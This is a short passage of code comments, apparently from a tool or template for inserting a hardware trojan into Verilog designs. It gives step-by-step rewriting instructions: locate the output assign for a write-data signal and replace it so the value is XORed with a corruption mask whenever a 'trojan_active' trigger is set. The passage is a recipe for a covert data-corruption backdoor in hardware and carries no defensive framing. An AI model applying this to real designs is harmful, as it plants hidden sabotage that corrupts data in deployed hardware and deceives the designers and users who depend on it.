...
//
// IMPORTANT: wdata_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If wdata_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for wdata_i (or first output assign):
//     assign wdata_i = <expr>;
//   Replace with:
//     assign wdata_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
